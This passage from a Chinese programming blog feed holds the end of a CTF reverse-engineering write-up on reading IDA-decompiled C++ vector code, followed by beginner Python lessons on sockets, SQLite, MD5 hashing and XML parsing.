class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v10);<span class="comment">// 指针自加，相当于数组下标+1</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v8);<span class="comment">// 指针++</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体注释我也写好了，匿名函数你在外部看不出什么，然后你双击进去后就能看出他是干什么了，这里就相当于</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt; num.Length; i++)</span><br><span class="line">    num[i] = num[<span class="number">0</span>] + num[i];</span><br></pre></td></tr></table></figure><h3 id="accumulate"><a href="#accumulate" class="headerlink" title="accumulate"></a>accumulate</h3><p>这部分对我来说可能最难理解的吧，他有好多层，我一层层进去后，最后才理解他是如何将容器进行倒置的</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, <span class="keyword">char</span> a7)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  v9 = a4;</span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v11, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v11);<span class="comment">//v11就是我们输入的元素，这里你可以对照我上面部分的注释，看传入的参数是什么</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v9);</span><br><span class="line"></span><br><span class="line">    main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v14, &amp;a7, &amp;v13, v7);<span class="comment">//这里是重点，倒置就在这里面</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(v9, &amp;v14);<span class="comment">//赋值语句没什么好说的</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v11);<span class="comment">//自增语句</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(v12, v9);</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先告诉你们我调试出来的结果吧，这部分让我自己看这ida代码，我看了好久，都没看懂他在干嘛，应该还是太菜了，所以我用gdb调试了一波，发觉他是每次取出一个元素，假设第一个元素，取出，第二个元素取出的时候，将他作为容器，将第一组的元素一个个push入栈达到逆置，然后保存这个容器，在取出一个元素，在创建一个只含这个元素的容器，将其作为主容器，将上次保存的容器的每个元素一个个进行push_back();然后循环一直下去就可以达到逆置的效果</p><p>举个例子说明吧： 假设元素为 1 2 3 4 5 6 7 8 9 10<br>第一次：创建一个只含1的容器(1)，其余什么都不做<br>第二次：创建一个只含2的容器(2)，将第一次创建的容器(1)里的元素，全部push到容器(2)里，保存容器(2)<br>第三次：创建一个只含3的容器(3),将容器2里的元素全部push到容器3里面</p><p>具体观察过程可以在循环里下断点进行观察，或者直接步过这部分，直接得到结果知道，由于我这里是分析文章，所以就进行了具体的分析</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::__copy_move&lt;<span class="literal">false</span>,<span class="literal">false</span>,<span class="built_in">std</span>::random_access_iterator_tag&gt;::__copy_m&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;&gt;(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v5 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = (a2 - a1) &gt;&gt; <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v5);</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v3, v7);<span class="comment">// 这里创建新容器，将数据压入栈</span></span><br><span class="line">    v7 += <span class="number">4L</span>L;</span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一部分我标注的重点里，一直点进去能看到这里的代码，在这里下断，随你用gdb还是ida都可以在这里观察整个过程，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">1       breakpoint     keep y   0x000000000040133f &lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; std::accumulate&lt;__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)<span class="comment">#2&#125;&gt;(__gnu_cxx::__normal_iterator&lt;int*, std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;, main::&#123;lambda(std::vector&lt;int, std::allocator&lt;int&gt; &gt;, int)#2&#125;)+113&gt;</span></span><br><span class="line">	breakpoint already hit 8 <span class="built_in">times</span></span><br><span class="line">2       breakpoint     keep y   0x0000000000400fd0 &lt;main+511&gt;</span><br><span class="line">3       breakpoint     keep y   0x00000000004020b3 &lt;std::back_insert_iterator&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt;::operator=(int const&amp;)+33&gt;</span><br><span class="line">	breakpoint already hit 6 <span class="built_in">times</span></span><br></pre></td></tr></table></figure><p>我这里用info b让你看下我下的断点，具体也可以自己进行调试，这样会让你更加理解这部分代码<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26uordtnnj31ha0qutji.jpg" alt="result"></p><p>我这里截了部分图，这是第一次循环的时候得到的结果，他只push了8进去，具体调试地址可以从ida里看，在代码界面右键Copy to assembly,在右键<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v4wpbkmj30vu0h6jsw.jpg" alt="picture1"><br>可以得到如下图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26v5tijt7j312w0fatch.jpg" alt="picture2"><br>这里便可以获得具体地址，然后调试部分就不讲了，有时间在写篇gdb如何调试的吧，在这题目里需要用的指令有</p><ul><li>x/10wx 显示的如第一张图所显示的一样</li><li>n 下一步</li><li>s 步进，也就是步进函数内部</li><li>c 继续</li><li>start 在开始处下断点</li></ul><p>具体的话:<br>这道题就是输入的第2-16个元素依次加上第一个元素，然后倒序排列，等于斐波那契数列就得出flag了，所以，反推之就是斐波那契数列倒序排列，在2-16个元素减去第一个元素就完美了，贴上代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(n==<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    array= [fib(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)][::<span class="number">-1</span>]</span><br><span class="line">    first = array[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> first,</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(array)<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">print</span> array[i+<span class="number">1</span>] - first,</span><br></pre></td></tr></table></figure><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g26wkec4pdj30zp0badir.jpg" alt="test"><br>运行截图</p><p>把这段复制到linux上运行即可得到flag，或者直接逆向也得到了</p><p>我的这篇文章文字不多，大部分文字都在代码里写注释了，因为这篇文章针对的就是如何分析C++的vector的反汇编代码，具体多余的文字赘述我也就没写了</p><h3 id="总结下："><a href="#总结下：" class="headerlink" title="总结下："></a><strong>总结下：</strong></h3><ol><li>在ida的f5插件识别出来的不会是你理想的c++代码，比如v24.begin(); 他会变成std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v24)；</int></li><li>在ida的f5插件识别出来的代码下，不清楚的部分可以跟进去，看看具体是什么操作</li><li>需要了解常见的vector容器的基本操作，在自己遇到的时候可以快速识别，不需要步进了解具体过程</li><li>在不了解具体过程的情况下，可以进行动态调试，方便自己理解</li></ol><p>好了，就说这么多了，我这篇图贴的不多，大部分都是代码，似乎都是代码，希望大佬们不要见怪</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/6e2e265a/">https://noone-hub.github.io/posts/6e2e265a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>reverse,逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第八天</title>
    <url>/posts/4a143a03/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><p>服务端与客户端间通过TCP/IP协议通信</p><p><strong>服务端</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">'Accept new connetction from %s:%s...'</span> %addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">or</span> data.decode(<span class="string">'utf-8'</span>) == <span class="string">'exit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send((<span class="string">'Hello, &#123;&#125;'</span>.format(data).encode(<span class="string">'utf-8'</span>)))</span><br><span class="line">    sock.close()</span><br><span class="line">    print(<span class="string">'Connection from %s:%s closed.'</span> %addr)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line">print(<span class="string">'Waiting for connection...'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=tcplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>客户端</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'Michael'</span>, <span class="string">b'Tracy'</span>, <span class="string">b'Sarah'</span>]:</span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">s.send(<span class="string">b'exit'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><p><strong>练习：请编写函数，在 Sqlite 中根据分数段查找指定的名字：</strong></p><p>这道题刚好上学期java期末作业做过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, sqlite3</span><br><span class="line"></span><br><span class="line">db_file = os.path.join(os.path.dirname(__file__), <span class="string">'test.db'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(db_file):</span><br><span class="line">    os.remove(db_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始数据:</span></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(db_file)</span><br><span class="line"></span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">'create table user(id varchar(20) primary key, name varchar(20), score int)'</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-001', 'Adam', 95)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-002', 'Bart', 62)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">r"insert into user values ('A-003', 'Lisa', 78)"</span>)</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一种我想得到的写法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user order by score"</span>)</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    List = []</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> values:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">2</span>] &gt;= low <span class="keyword">and</span> result[<span class="number">2</span>]&lt;=high:</span><br><span class="line">            List.append(result[<span class="number">1</span>])</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> List</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种写法，感觉更好，直接用数据库排好序了，不知道sql语法的可以跟我上面那个一样</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score_in</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    conn = sqlite3.connect(db_file)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">r"select * from user where score between ? and ? order by score"</span>,(low,high))</span><br><span class="line">    values = cursor.fetchall()</span><br><span class="line">    name = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> values]</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"><span class="string">' 返回指定分数区间的名字，按分数从低到高排序 '</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">80</span>, <span class="number">95</span>) == [<span class="string">'Adam'</span>], get_score_in(<span class="number">80</span>, <span class="number">95</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">80</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>], get_score_in(<span class="number">60</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> get_score_in(<span class="number">60</span>, <span class="number">100</span>) == [<span class="string">'Bart'</span>, <span class="string">'Lisa'</span>, <span class="string">'Adam'</span>],get_score_in(<span class="number">60</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Pass'</span>)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/4a143a03/">https://noone-hub.github.io/posts/4a143a03/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第七天学习</title>
    <url>/posts/b164eb0e/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="hashlib的使用"><a href="#hashlib的使用" class="headerlink" title="hashlib的使用"></a>hashlib的使用</h2><p><strong>设计一个验证用户登录的函数，根据用户输入的口令是否正确，返回True 或 False：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>so easy,直接贴代码吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line">db = &#123;</span><br><span class="line"><span class="string">'michael'</span>: <span class="string">'e10adc3949ba59abbe56e057f20f883e'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'bob'</span>: <span class="string">'878ef96e86145580c38c87f0410ad153'</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">'alice'</span>: <span class="string">'99b1c2188db85afee403b1536010c2c9'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(user,password)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (db[user],calc_md5(password))</span><br><span class="line">    <span class="keyword">if</span> db[user] == calc_md5(password):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> login(<span class="string">'bob'</span>,<span class="string">'123456'</span>):</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"fail"</span>)</span><br></pre></td></tr></table></figure><p><strong>根据用户输入的登录名和口令模拟用户注册，计算更安全的 MD5：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">db[username] = get_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line">然后，根据修改后的 MD5 算法实现用户登录的验证：</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>这种题目也是送分题啊，直接贴代码了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">db = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_md5</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(passwd.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    db[username] = calc_md5(password + username + <span class="string">'the-Salt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> db[username] == calc_md5(password + username + <span class="string">'the-Salt'</span>):</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"sucess"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br><span class="line">register(<span class="string">'robot'</span>,<span class="string">'123456'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'12345'</span>)</span><br><span class="line">login(<span class="string">'bob'</span>,<span class="string">'123456'</span>)</span><br></pre></td></tr></table></figure><h2 id="xml解析"><a href="#xml解析" class="headerlink" title="xml解析"></a>xml解析</h2><p><strong>请利用 SAX 编写程序解析 Yahoo 的 XML 格式的天气预报，获取当天<br>和第二天的天气：</strong><br>这部分对我来说有点难理解，不过查阅资料和看博客后自己依葫芦画瓢还是做出来了<br>贴上代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> xml.parsers.expat <span class="keyword">import</span> ParserCreate</span><br><span class="line">data = <span class="string">r'''&lt;?xml version="1.0" encoding="UTF-8" standalone="yes" ?&gt;</span></span><br><span class="line"><span class="string">&lt;rss version="2.0" xmlns:yweather="http://xml.weather.yahoo.com/ns/rss/1.0" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"&gt;</span></span><br><span class="line"><span class="string">    &lt;channel&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Yahoo! Weather - Beijing, CN&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;lastBuildDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/lastBuildDate&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:location city="Beijing" region="" country="China"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:units temperature="C" distance="km" pressure="mb" speed="km/h"/&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:wind chill="28" direction="180" speed="14.48" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:atmosphere humidity="53" visibility="2.61" pressure="1006.1" rising="0" /&gt;</span></span><br><span class="line"><span class="string">        &lt;yweather:astronomy sunrise="4:51 am" sunset="7:32 pm"/&gt;</span></span><br><span class="line"><span class="string">        &lt;item&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:lat&gt;39.91&lt;/geo:lat&gt;</span></span><br><span class="line"><span class="string">            &lt;geo:long&gt;116.39&lt;/geo:long&gt;</span></span><br><span class="line"><span class="string">            &lt;pubDate&gt;Wed, 27 May 2015 11:00 am CST&lt;/pubDate&gt;</span></span><br><span class="line"><span class="string">            &lt;yweather:condition text="Haze" code="21" temp="28" date="Wed, 27 May 2015 11:00 am CST" /&gt;</span></span><br><span class="line"><span class="string">     